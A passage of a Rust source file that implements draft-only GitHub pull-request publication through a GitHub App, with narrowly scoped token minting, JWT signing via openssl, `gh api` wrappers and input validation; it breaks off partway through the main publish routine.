//! Crash-resumable, draft-only publication through a narrowed GitHub App token.

use std::{
    collections::{BTreeMap, HashMap},
    ffi::OsString,
    future::Future,
    os::unix::fs::{OpenOptionsExt as _, PermissionsExt as _},
    path::{Path, PathBuf},
    pin::Pin,
    sync::Arc,
    time::Duration,
};

use base64::{Engine as _, engine::general_purpose::URL_SAFE_NO_PAD};
use factory_verify::runtime::tree_hash;
use serde::{Deserialize, Serialize};
use sha2::{Digest as _, Sha256};
use thiserror::Error;
use time::{OffsetDateTime, format_description::well_known::Rfc3339};
use tokio_util::sync::CancellationToken;
use uuid::Uuid;

use crate::{
    process::{ProcessError, ProcessSpec, run_bounded},
    store::{
        PublicationStore, PublisherStore, PullRequestRecord, SideEffectDisposition, StoreError,
    },
    worktree::{DetachedWorktree, WorktreeError, hash_commit_tree},
};

const GITHUB_API_VERSION: &str = "2022-11-28";
const MAX_GITHUB_OUTPUT: usize = 2 * 1024 * 1024;

#[derive(Clone, Debug, Eq, PartialEq)]
pub struct RepositoryScope {
    pub owner: String,
    pub name: String,
}

impl RepositoryScope {
    #[must_use]
    pub fn full_name(&self) -> String {
        format!("{}/{}", self.owner, self.name)
    }

    fn validate(&self) -> Result<(), PublisherError> {
        validate_slug("repository owner", &self.owner)?;
        validate_slug("repository name", &self.name)?;
        Ok(())
    }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum TokenPurpose {
    Publish,
    Reconcile,
    Lifecycle,
    ReadyForReview,
}

impl TokenPurpose {
    fn permissions(self) -> GitHubPermissions {
        match self {
            Self::Publish => GitHubPermissions {
                contents: PermissionLevel::Write,
                pull_requests: PermissionLevel::Write,
                checks: None,
            },
            Self::Reconcile => GitHubPermissions {
                contents: PermissionLevel::Read,
                pull_requests: PermissionLevel::Read,
                checks: None,
            },
            Self::Lifecycle => GitHubPermissions {
                contents: PermissionLevel::Read,
                pull_requests: PermissionLevel::Write,
                checks: Some(PermissionLevel::Read),
            },
            // GitHub's GraphQL ready-for-review mutation rejects an
            // installation token with pull-request write plus contents read.
            // Mint the required contents-write scope only at the final gate,
            // after evidence and the live body contract have passed.
            Self::ReadyForReview => GitHubPermissions {
                contents: PermissionLevel::Write,
                pull_requests: PermissionLevel::Write,
                checks: None,
            },
        }
    }
}

#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq, Serialize)]
#[serde(rename_all = "snake_case")]
enum PermissionLevel {
    Read,
    Write,
}

#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq, Serialize)]
struct GitHubPermissions {
    contents: PermissionLevel,
    pull_requests: PermissionLevel,
    #[serde(skip_serializing_if = "Option::is_none")]
    checks: Option<PermissionLevel>,
}

#[derive(Clone, Debug)]
pub struct InstallationToken {
    pub(crate) value: String,
    pub bot: BotIdentity,
}

impl InstallationToken {
    fn expose(&self) -> &str {
        &self.value
    }
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq)]
pub struct BotIdentity {
    pub id: u64,
    pub login: String,
}

impl BotIdentity {
    #[must_use]
    pub fn email(&self) -> String {
        format!("{}+{}@users.noreply.github.com", self.id, self.login)
    }
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq)]
pub struct PullRequest {
    pub number: i32,
    pub node_id: String,
    pub draft: bool,
    pub state: String,
    pub body: Option<String>,
    pub html_url: String,
    pub head: PullRequestRef,
    pub base: PullRequestRef,
    pub user: GitHubUser,
    pub updated_at: String,
    pub merged_at: Option<String>,
    pub merge_commit_sha: Option<String>,
    pub merged_by: Option<GitHubUser>,
}

impl PullRequest {
    pub fn updated_at(&self) -> Result<OffsetDateTime, GitHubError> {
        OffsetDateTime::parse(&self.updated_at, &Rfc3339)
            .map_err(|_| GitHubError::MalformedResponse("pull request updated_at"))
    }

    pub fn merged_at(&self) -> Result<Option<OffsetDateTime>, GitHubError> {
        self.merged_at
            .as_deref()
            .map(|value| {
                OffsetDateTime::parse(value, &Rfc3339)
                    .map_err(|_| GitHubError::MalformedResponse("pull request merged_at"))
            })
            .transpose()
    }
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq)]
pub struct PullRequestRef {
    #[serde(rename = "ref")]
    pub branch: String,
    pub sha: String,
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq)]
pub struct GitHubUser {
    pub login: String,
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq)]
pub struct Review {
    pub state: String,
    pub commit_id: String,
    pub submitted_at: Option<String>,
    pub user: GitHubUser,
}

#[derive(Clone, Debug)]
pub struct OpenPullRequestSnapshot {
    pub observed_at: OffsetDateTime,
    pub pull_requests: Vec<PullRequest>,
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct CheckRun {
    pub id: u64,
    pub name: String,
    pub head_sha: String,
    pub status: String,
    pub conclusion: Option<String>,
    pub details_url: String,
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct CheckRuns {
    pub total_count: usize,
    pub check_runs: Vec<CheckRun>,
}

pub type GitHubFuture<'a, T> = Pin<Box<dyn Future<Output = Result<T, GitHubError>> + Send + 'a>>;
pub type PublisherFuture<'a> =
    Pin<Box<dyn Future<Output = Result<PublishedPullRequest, PublisherError>> + Send + 'a>>;

pub trait GitHubApi: Send + Sync {
    fn mint_token<'a>(
        &'a self,
        repository: &'a RepositoryScope,
        purpose: TokenPurpose,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, InstallationToken>;

    fn open_pull_requests<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        limit: usize,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, OpenPullRequestSnapshot>;

    fn pull_requests_for_branch<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        branch: &'a str,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, Vec<PullRequest>>;

    fn create_draft_pull_request<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        request: &'a CreatePullRequest,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, PullRequest>;

    fn check_runs<'a>(
        &'a self,
        _token: &'a InstallationToken,
        _repository: &'a RepositoryScope,
        _head_sha: &'a str,
        _cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, CheckRuns> {
        Box::pin(async { Err(GitHubError::InvalidConfig("check-runs API unavailable")) })
    }

    fn update_pull_request_body<'a>(
        &'a self,
        _token: &'a InstallationToken,
        _repository: &'a RepositoryScope,
        _number: i32,
        _body: &'a str,
        _cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, PullRequest> {
        Box::pin(async {
            Err(GitHubError::InvalidConfig(
                "pull-request update API unavailable",
            ))
        })
    }

    fn mark_pull_request_ready<'a>(
        &'a self,
        _token: &'a InstallationToken,
        _pull_request_node_id: &'a str,
        _cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, ()> {
        Box::pin(async {
            Err(GitHubError::InvalidConfig(
                "ready-for-review API unavailable",
            ))
        })
    }

    fn reviews<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        number: i32,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, Vec<Review>>;

    fn delete_branch<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        branch: &'a str,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, ()>;
}

/// Object-safe publication boundary used by the pipeline. The concrete
/// publisher retains its typed store while fixture pipelines can explicitly
/// run without any credentialed publication capability.
pub trait PublishService: Send + Sync {
    fn publish<'a>(
        &'a self,
        input: &'a PublishInput,
        patch_path: &'a Path,
        cancellation: &'a CancellationToken,
    ) -> PublisherFuture<'a>;
}

#[derive(Clone, Debug)]
pub struct GhGitHubConfig {
    pub gh_program: PathBuf,
    pub curl_program: PathBuf,
    pub openssl_program: PathBuf,
    pub app_id: u64,
    pub installation_id: u64,
    pub app_slug: String,
    pub private_key: PathBuf,
    pub scratch: PathBuf,
    pub timeout: Duration,
}

#[derive(Clone, Debug)]
pub struct GhGitHub {
    config: GhGitHubConfig,
}

impl GhGitHub {
    pub fn new(config: GhGitHubConfig) -> Result<Self, GitHubError> {
        if config.app_id == 0 || config.installation_id == 0 {
            return Err(GitHubError::InvalidConfig("GitHub App identifiers"));
        }
        validate_slug_github("GitHub App slug", &config.app_slug)?;
        if config.timeout.is_zero() || config.timeout > Duration::from_secs(300) {
            return Err(GitHubError::InvalidConfig("GitHub timeout"));
        }
        Ok(Self { config })
    }

    async fn app_jwt(&self, cancellation: &CancellationToken) -> Result<String, GitHubError> {
        let private_key = self.config.private_key.clone();
        tokio::task::spawn_blocking(move || {
            let metadata = std::fs::symlink_metadata(&private_key)?;
            if !metadata.is_file()
                || metadata.file_type().is_symlink()
                || metadata.permissions().mode() & 0o007 != 0
            {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::PermissionDenied,
                    "GitHub App key must be a regular non-symlink file with no world access",
                ));
            }
            Ok(())
        })
        .await
        .map_err(GitHubError::Join)??;
        let now = OffsetDateTime::now_utc().unix_timestamp();
        let header = URL_SAFE_NO_PAD.encode(br#"{"alg":"RS256","typ":"JWT"}"#);
        let payload = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&serde_json::json!({
            "iat": now - 60,
            "exp": now + 540,
            "iss": self.config.app_id.to_string(),
        }))?);
        let unsigned = format!("{header}.{payload}");
        let input = PrivateInput::create(
            &self.config.scratch,
            "github-jwt",
            unsigned.as_bytes().to_vec(),
        )
        .await?;
        let mut spec = ProcessSpec::new(&self.config.openssl_program);
        spec.args = vec![
            OsString::from("dgst"),
            OsString::from("-sha256"),
            OsString::from("-sign"),
            self.config.private_key.as_os_str().to_owned(),
            OsString::from("-binary"),
            input.path().as_os_str().to_owned(),
        ];
        spec.timeout = Duration::from_secs(30);
        spec.output_limit = 64 * 1024;
        let signing = run_bounded(&spec, cancellation).await;
        let cleanup = input.close().await;
        let signature = match (signing, cleanup) {
            (Ok(output), Ok(())) if output.code == 0 => output.stdout,
            (Ok(output), Ok(())) => {
                return Err(GitHubError::CommandFailed {
                    operation: "sign App JWT",
                    code: output.code,
                });
            }
            (Err(error), Ok(())) => return Err(error.into()),
            (_, Err(error)) => return Err(error),
        };
        Ok(format!("{unsigned}.{}", URL_SAFE_NO_PAD.encode(signature)))
    }

    async fn gh_json<T: for<'de> Deserialize<'de>>(
        &self,
        token: &str,
        method: &str,
        endpoint: String,
        fields: &[(String, String)],
        input: Option<&Path>,
        cancellation: &CancellationToken,
    ) -> Result<T, GitHubError> {
        let output = self
            .gh(token, method, endpoint, fields, input, cancellation)
            .await?;
        serde_json::from_slice(&output).map_err(GitHubError::Json)
    }

    async fn mint_json<T: for<'de> Deserialize<'de>>(
        &self,
        jwt: &str,
        input: &Path,
        cancellation: &CancellationToken,
    ) -> Result<T, GitHubError> {
        // `gh api` sends GH_TOKEN with the token authentication scheme, while
        // GitHub's App-JWT endpoint requires Bearer. Keep the JWT out of argv
        // by putting curl's fixed request in an owner-only ephemeral config.
        let config = PrivateInput::create(
            &self.config.scratch,
            "github-mint-curl",
            format!(
                "fail-with-body\n\
                 silent\n\
                 show-error\n\
                 proto = \"=https\"\n\
                 tlsv1.2\n\
                 request = \"POST\"\n\
                 header = \"Accept: application/vnd.github+json\"\n\
                 header = \"Authorization: Bearer {jwt}\"\n\
                 header = \"X-GitHub-Api-Version: {GITHUB_API_VERSION}\"\n\
                 data-binary = \"@{}\"\n\
                 url = \"https://api.github.com/app/installations/{}/access_tokens\"\n",
                input.display(),
                self.config.installation_id,
            )
            .into_bytes(),
        )
        .await?;
        let mut spec = ProcessSpec::new(&self.config.curl_program);
        spec.args = vec![
            OsString::from("-q"),
            OsString::from("--config"),
            config.path().as_os_str().to_owned(),
        ];
        spec.timeout = self.config.timeout;
        spec.output_limit = MAX_GITHUB_OUTPUT;
        let request = run_bounded(&spec, cancellation).await;
        let cleanup = config.close().await;
        let output = match (request, cleanup) {
            (Ok(output), Ok(())) if output.code == 0 => output.stdout,
            (Ok(output), Ok(())) => {
                return Err(GitHubError::CommandFailed {
                    operation: "GitHub App token mint",
                    code: output.code,
                });
            }
            (Err(error), Ok(())) => return Err(error.into()),
            (_, Err(error)) => return Err(error),
        };
        serde_json::from_slice(&output).map_err(GitHubError::Json)
    }

    async fn gh(
        &self,
        token: &str,
        method: &str,
        endpoint: String,
        fields: &[(String, String)],
        input: Option<&Path>,
        cancellation: &CancellationToken,
    ) -> Result<Vec<u8>, GitHubError> {
        let mut spec = ProcessSpec::new(&self.config.gh_program);
        spec.args = vec![
            OsString::from("api"),
            OsString::from("--method"),
            OsString::from(method),
            OsString::from("-H"),
            OsString::from("Accept: application/vnd.github+json"),
            OsString::from("-H"),
            OsString::from(format!("X-GitHub-Api-Version: {GITHUB_API_VERSION}")),
        ];
        for (name, value) in fields {
            spec.args.push(OsString::from("-f"));
            spec.args.push(OsString::from(format!("{name}={value}")));
        }
        if let Some(input) = input {
            spec.args.push(OsString::from("--input"));
            spec.args.push(input.as_os_str().to_owned());
        }
        spec.args.push(OsString::from(endpoint));
        spec.environment = vec![
            (OsString::from("GH_TOKEN"), OsString::from(token)),
            (OsString::from("GH_HOST"), OsString::from("github.com")),
            (OsString::from("GH_PROMPT_DISABLED"), OsString::from("1")),
        ];
        spec.timeout = self.config.timeout;
        spec.output_limit = MAX_GITHUB_OUTPUT;
        let output = run_bounded(&spec, cancellation).await?;
        if output.code != 0 {
            return Err(GitHubError::CommandFailed {
                operation: "GitHub API",
                code: output.code,
            });
        }
        Ok(output.stdout)
    }
}

impl GitHubApi for GhGitHub {
    fn mint_token<'a>(
        &'a self,
        repository: &'a RepositoryScope,
        purpose: TokenPurpose,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, InstallationToken> {
        Box::pin(async move {
            repository
                .validate()
                .map_err(|_| GitHubError::InvalidConfig("repository scope"))?;
            let permissions = purpose.permissions();
            let input = PrivateInput::create(
                &self.config.scratch,
                "github-mint",
                serde_json::to_vec(&serde_json::json!({
                    "repositories": [&repository.name],
                    "permissions": permissions,
                }))?,
            )
            .await?;
            let jwt = self.app_jwt(cancellation).await;
            let response = match jwt {
                Ok(jwt) => {
                    self.mint_json::<MintResponse>(&jwt, input.path(), cancellation)
                        .await
                }
                Err(error) => Err(error),
            };
            let cleanup = input.close().await;
            let response = match (response, cleanup) {
                (Ok(response), Ok(())) => response,
                (Err(error), Ok(())) => return Err(error),
                (_, Err(error)) => return Err(error),
            };
            validate_mint_response(&response, repository, permissions)?;
            let expires_at = OffsetDateTime::parse(&response.expires_at, &Rfc3339)
                .map_err(|_| GitHubError::MalformedResponse("installation token expiry"))?;
            let remaining = expires_at - OffsetDateTime::now_utc();
            if remaining < time::Duration::minutes(15) || remaining > time::Duration::minutes(65) {
                return Err(GitHubError::UnsafeTokenExpiry);
            }
            let bot_login = format!("{}[bot]", self.config.app_slug);
            let bot: BotIdentity = self
                .gh_json(
                    &response.token,
                    "GET",
                    format!("users/{bot_login}"),
                    &[],
                    None,
                    cancellation,
                )
                .await?;
            if bot.login != bot_login || bot.id == 0 {
                return Err(GitHubError::MalformedResponse("GitHub App bot identity"));
            }
            Ok(InstallationToken {
                value: response.token,
                bot,
            })
        })
    }

    fn open_pull_requests<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        limit: usize,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, OpenPullRequestSnapshot> {
        Box::pin(async move {
            if !(1..=100).contains(&limit) {
                return Err(GitHubError::InvalidConfig("open PR query limit"));
            }
            let pulls: Vec<PullRequest> = self
                .gh_json(
                    token.expose(),
                    "GET",
                    format!("repos/{}/pulls", repository.full_name()),
                    &[
                        ("state".to_owned(), "open".to_owned()),
                        ("per_page".to_owned(), "100".to_owned()),
                    ],
                    None,
                    cancellation,
                )
                .await?;
            if pulls.len() == 100 {
                return Err(GitHubError::IncompleteOpenPullRequestSnapshot);
            }
            let pull_requests = pulls
                .into_iter()
                .filter(|pull| {
                    pull.user.login == token.bot.login && pull.head.branch.starts_with("factory/")
                })
                .take(limit)
                .collect();
            Ok(OpenPullRequestSnapshot {
                observed_at: OffsetDateTime::now_utc(),
                pull_requests,
            })
        })
    }

    fn pull_requests_for_branch<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        branch: &'a str,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, Vec<PullRequest>> {
        Box::pin(async move {
            self.gh_json(
                token.expose(),
                "GET",
                format!("repos/{}/pulls", repository.full_name()),
                &[
                    ("state".to_owned(), "all".to_owned()),
                    ("head".to_owned(), format!("{}:{branch}", repository.owner)),
                    ("per_page".to_owned(), "2".to_owned()),
                ],
                None,
                cancellation,
            )
            .await
        })
    }

    fn create_draft_pull_request<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        request: &'a CreatePullRequest,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, PullRequest> {
        Box::pin(async move {
            let input = PrivateInput::create(
                &self.config.scratch,
                "github-create-pr",
                serde_json::to_vec(request)?,
            )
            .await?;
            let result = self
                .gh_json(
                    token.expose(),
                    "POST",
                    format!("repos/{}/pulls", repository.full_name()),
                    &[],
                    Some(input.path()),
                    cancellation,
                )
                .await;
            let cleanup = input.close().await;
            match (result, cleanup) {
                (Ok(pull), Ok(())) => Ok(pull),
                (Err(error), Ok(())) => Err(error),
                (_, Err(error)) => Err(error),
            }
        })
    }

    fn check_runs<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        head_sha: &'a str,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, CheckRuns> {
        Box::pin(async move {
            validate_git_sha("check-runs head", head_sha)
                .map_err(|_| GitHubError::InvalidConfig("check-runs head"))?;
            self.gh_json(
                token.expose(),
                "GET",
                format!(
                    "repos/{}/commits/{head_sha}/check-runs",
                    repository.full_name()
                ),
                &[
                    ("filter".to_owned(), "latest".to_owned()),
                    ("per_page".to_owned(), "100".to_owned()),
                ],
                None,
                cancellation,
            )
            .await
        })
    }

    fn update_pull_request_body<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        number: i32,
        body: &'a str,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, PullRequest> {
        Box::pin(async move {
            if number <= 0 {
                return Err(GitHubError::InvalidConfig("pull request number"));
            }
            validate_pr_body(body).map_err(|_| GitHubError::InvalidConfig("pull request body"))?;
            let input = PrivateInput::create(
                &self.config.scratch,
                "github-update-pr",
                serde_json::to_vec(&serde_json::json!({"body": body}))?,
            )
            .await?;
            let result = self
                .gh_json(
                    token.expose(),
                    "PATCH",
                    format!("repos/{}/pulls/{number}", repository.full_name()),
                    &[],
                    Some(input.path()),
                    cancellation,
                )
                .await;
            let cleanup = input.close().await;
            match (result, cleanup) {
                (Ok(pull), Ok(())) => Ok(pull),
                (Err(error), Ok(())) => Err(error),
                (_, Err(error)) => Err(error),
            }
        })
    }

    fn mark_pull_request_ready<'a>(
        &'a self,
        token: &'a InstallationToken,
        pull_request_node_id: &'a str,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, ()> {
        Box::pin(async move {
            validate_label("pull request node ID", pull_request_node_id, 256)
                .map_err(|_| GitHubError::InvalidConfig("pull request node ID"))?;
            let response: MarkReadyResponse = self
                .gh_json(
                    token.expose(),
                    "POST",
                    "graphql".to_owned(),
                    &[
                        (
                            "query".to_owned(),
                            "mutation($pullRequestId:ID!){markPullRequestReadyForReview(input:{pullRequestId:$pullRequestId}){pullRequest{id isDraft}}}".to_owned(),
                        ),
                        (
                            "pullRequestId".to_owned(),
                            pull_request_node_id.to_owned(),
                        ),
                    ],
                    None,
                    cancellation,
                )
                .await?;
            let ready_pull = response
                .data
                .mark_pull_request_ready_for_review
                .pull_request;
            if ready_pull.id != pull_request_node_id || ready_pull.is_draft {
                return Err(GitHubError::MalformedResponse("ready-for-review mutation"));
            }
            Ok(())
        })
    }

    fn reviews<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        number: i32,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, Vec<Review>> {
        Box::pin(async move {
            if number <= 0 {
                return Err(GitHubError::InvalidConfig("pull request number"));
            }
            self.gh_json(
                token.expose(),
                "GET",
                format!("repos/{}/pulls/{number}/reviews", repository.full_name()),
                &[("per_page".to_owned(), "100".to_owned())],
                None,
                cancellation,
            )
            .await
        })
    }

    fn delete_branch<'a>(
        &'a self,
        token: &'a InstallationToken,
        repository: &'a RepositoryScope,
        branch: &'a str,
        cancellation: &'a CancellationToken,
    ) -> GitHubFuture<'a, ()> {
        Box::pin(async move {
            validate_branch(branch).map_err(|_| GitHubError::InvalidConfig("branch"))?;
            let _output = self
                .gh(
                    token.expose(),
                    "DELETE",
                    format!(
                        "repos/{}/git/refs/heads/{}",
                        repository.full_name(),
                        percent_encode(branch)
                    ),
                    &[],
                    None,
                    cancellation,
                )
                .await?;
            Ok(())
        })
    }
}

#[derive(Debug, Deserialize)]
struct MintResponse {
    token: String,
    expires_at: String,
    permissions: BTreeMap<String, String>,
    repositories: Vec<MintRepository>,
}

#[derive(Debug, Deserialize)]
struct MintRepository {
    name: String,
    full_name: String,
}

#[derive(Debug, Deserialize)]
struct MarkReadyResponse {
    data: MarkReadyData,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct MarkReadyData {
    mark_pull_request_ready_for_review: MarkReadyPayload,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct MarkReadyPayload {
    pull_request: MarkReadyPullRequest,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct MarkReadyPullRequest {
    id: String,
    is_draft: bool,
}

fn validate_mint_response(
    response: &MintResponse,
    repository: &RepositoryScope,
    requested: GitHubPermissions,
) -> Result<(), GitHubError> {
    if response.token.trim().is_empty()
        || response.repositories.len() != 1
        || response.repositories[0].name != repository.name
        || response.repositories[0].full_name != repository.full_name()
    {
        return Err(GitHubError::UnsafeTokenScope);
    }
    let mut expected = BTreeMap::from([
        (
            "contents".to_owned(),
            permission_name(requested.contents).to_owned(),
        ),
        (
            "pull_requests".to_owned(),
            permission_name(requested.pull_requests).to_owned(),
        ),
    ]);
    // GitHub always adds metadata:read to an installation token. No other
    // implicit permission is accepted.
    expected.insert("metadata".to_owned(), "read".to_owned());
    if let Some(checks) = requested.checks {
        expected.insert("checks".to_owned(), permission_name(checks).to_owned());
    }
    if response.permissions != expected {
        return Err(GitHubError::UnsafeTokenScope);
    }
    Ok(())
}

const fn permission_name(permission: PermissionLevel) -> &'static str {
    match permission {
        PermissionLevel::Read => "read",
        PermissionLevel::Write => "write",
    }
}

#[derive(Clone, Debug)]
pub struct PublisherConfig {
    pub repository: RepositoryScope,
    pub base_branch: String,
    pub worktree_root: PathBuf,
    pub git_program: PathBuf,
    pub git_askpass: PathBuf,
    pub holder: String,
    pub max_open_prs: usize,
    pub github_freshness: Duration,
    pub lease_ttl: Duration,
    pub fault_after: Option<CrashPoint>,
    #[cfg(test)]
    pub(crate) test_remote: Option<String>,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum CrashPoint {
    BeforeBranchPush,
    AfterBranchPush,
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
#[serde(deny_unknown_fields)]
pub struct RootCause {
    pub path: String,
    pub line: u32,
    pub cause: String,
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
#[serde(deny_unknown_fields)]
pub struct ReviewContract {
    pub request_source: String,
    pub verbatim_request: String,
    pub lane: String,
    pub rubric_version: String,
    pub root_causes: Vec<RootCause>,
    pub named_assumptions: Vec<String>,
    pub risk: String,
    pub rollback: String,
    pub draft_reply: String,
    pub reviewer_quiz: Vec<String>,
    pub shared_function_touched: bool,
    pub explain_diff: Option<String>,
}

impl ReviewContract {
    fn validate(&self) -> Result<(), PublisherError> {
        validate_label("request source", &self.request_source, 256)?;
        if self.verbatim_request.trim().is_empty()
            || self.verbatim_request.len() > 30_000
            || self.verbatim_request.contains('\0')
            || self.lane != "A"
        {
            return Err(PublisherError::InvalidInput("review request contract"));
        }
        validate_label("rubric version", &self.rubric_version, 64)?;
        if self.root_causes.is_empty()
            || self.root_causes.len() > 8
            || self.named_assumptions.is_empty()
            || self.named_assumptions.len() > 8
            || !(1..=2).contains(&self.reviewer_quiz.len())
            || (self.shared_function_touched && self.explain_diff.is_none())
        {
            return Err(PublisherError::InvalidInput("review contract shape"));
        }
        let mut paths = std::collections::BTreeSet::new();
        for root in &self.root_causes {
            validate_repo_path(&root.path)?;
            if root.line == 0
                || !paths.insert(&root.path)
                || !safe_contract_prose(&root.cause, 1_000)
            {
                return Err(PublisherError::InvalidInput("root cause"));
            }
        }
        for value in self
            .named_assumptions
            .iter()
            .chain([&self.risk, &self.rollback, &self.draft_reply])
            .chain(self.reviewer_quiz.iter())
            .chain(self.explain_diff.iter())
        {
            if !safe_contract_prose(value, 2_000) {
                return Err(PublisherError::InvalidInput("review contract prose"));
            }
        }
        Ok(())
    }
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
#[serde(deny_unknown_fields)]
pub struct PublishInput {
    pub schema_version: u16,
    pub request_id: Uuid,
    pub run_id: Uuid,
    pub attempts: u8,
    pub branch: String,
    pub base_sha: String,
    pub patch_relative_path: String,
    pub patch_sha256: String,
    pub expected_tree_hash: String,
    pub title: String,
    pub body: String,
    pub review_contract: ReviewContract,
}

impl PublishInput {
    pub fn validate(&self) -> Result<(), PublisherError> {
        if self.schema_version != 2 {
            return Err(PublisherError::InvalidInput("schema version"));
        }
        if !(1..=2).contains(&self.attempts) {
            return Err(PublisherError::InvalidInput("attempt count"));
        }
        validate_git_sha("base SHA", &self.base_sha)?;
        validate_sha256("patch digest", &self.patch_sha256)?;
        validate_sha256("result tree hash", &self.expected_tree_hash)?;
        validate_branch(&self.branch)?;
        validate_title(&self.title)?;
        validate_pr_body(&self.body)?;
        self.review_contract.validate()?;
        if self.patch_relative_path.starts_with('/')
            || self
                .patch_relative_path
                .split('/')
                .any(|part| part.is_empty() || matches!(part, "." | ".."))
        {
            return Err(PublisherError::InvalidInput("patch path"));
        }
        if !branch_belongs_to_request(&self.branch, self.request_id) {
            return Err(PublisherError::ForeignBranch(self.branch.clone()));
        }
        Ok(())
    }
}

#[derive(Clone, Debug, Eq, PartialEq, Serialize)]
pub struct PublishedPullRequest {
    pub number: i32,
    pub url: String,
    pub branch: String,
    pub head_sha: String,
    pub author_login: String,
}

#[derive(Clone)]
pub struct Publisher<S: PublicationStore + PublisherStore> {
    store: S,
    github: Arc<dyn GitHubApi>,
    config: PublisherConfig,
}

impl<S: PublicationStore + PublisherStore> Publisher<S> {
    pub fn new(
        store: S,
        github: Arc<dyn GitHubApi>,
        config: PublisherConfig,
    ) -> Result<Self, PublisherError> {
        config.repository.validate()?;
        validate_branch(&config.base_branch)?;
        validate_label("publisher holder", &config.holder, 128)?;
        if config.max_open_prs != 2 {
            return Err(PublisherError::InvalidConfig(
                "phase-1 open PR cap must be exactly two",
            ));
        }
        if config.github_freshness.is_zero()
            || config.github_freshness > Duration::from_secs(300)
            || config.lease_ttl != Duration::from_secs(3_600)
        {
            return Err(PublisherError::InvalidConfig("publisher durations"));
        }
        Ok(Self {
            store,
            github,
            config,
        })
    }

    #[must_use]
    pub fn repository_path(&self) -> PathBuf {
        self.config
            .worktree_root
            .join(format!("{}.git", self.config.repository.name))
    }

    pub async fn prepare_base(
        &self,
        base_sha: &str,
        cancellation: &CancellationToken,
    ) -> Result<(), PublisherError> {
        validate_git_sha("base SHA", base_sha)?;
        let token = self
            .github
            .mint_token(&self.config.repository, TokenPurpose::Publish, cancellation)
            .await?;
        self.ensure_bare_repository(&token, base_sha, cancellation)
            .await
    }

    pub async fn publish(
        &self,
        input: &PublishInput,
        patch_path: &Path,
        cancellation: &CancellationToken,
    ) -> Result<PublishedPullRequest, PublisherError> {
        input.validate()?;
        let holder = format!("{}:{}", self.config.holder, input.run_id);
        let resource = format!("publisher:{}", self.config.repository.full_name());
        let lease = self
            .store
            .acquire_publisher_lease(
                &resource,
                input.request_id,
                input.run_id,
                &holder,
                self.config.lease_ttl,
            )
            .await?;
        let result = self
            .publish_under_lease(input, patch_path, cancellation)
            .await;
        let release = self.store.release_publisher_lease(&lease).await;
        match (result, release) {
            (Ok(outcome), Ok(())) => Ok(outcome),
            (Err(error), Ok(())) => Err(error),
            (_, Err(error)) => Err(error.into()),
        }
    }

    async fn publish_under_lease(
        &self,
        input: &PublishInput,
        patch_path: &Path,
        cancellation: &CancellationToken,
    ) -> Result<PublishedPullRequest, PublisherError> {
        let patch_digest = hash_regular_file(patch_path, 1024 * 1024).await?;
        if patch_digest != input.patch_sha256 {
            return Err(PublisherError::PatchDigestMismatch {
                expected: input.patch_sha256.clone(),
                actual: patch_digest,
            });
        }
        self.store
            .transition_publication(
                input.request_id,
                input.run_id,
                "publisher.started",
                "publishing",
                &format!("publisher:{}:started", input.run_id),
                serde_json::json!({"repository": self.config.repository.full_name()}),
            )
            .await?;
        let token = match self
            .github
            .mint_token(&self.config.repository, TokenPurpose::Publish, cancellation)
            .await
        {
            Ok(token) => token,
            Err(error) => {
                self.record_github_failure(&error).await?;
                return Err(error.into());
            }
        };
        let existing = match self
            .github
            .pull_requests_for_branch(&token, &self.config.repository, &input.branch, cancellation)
            .await
        {
            Ok(pulls) => pulls,
            Err(error) => {
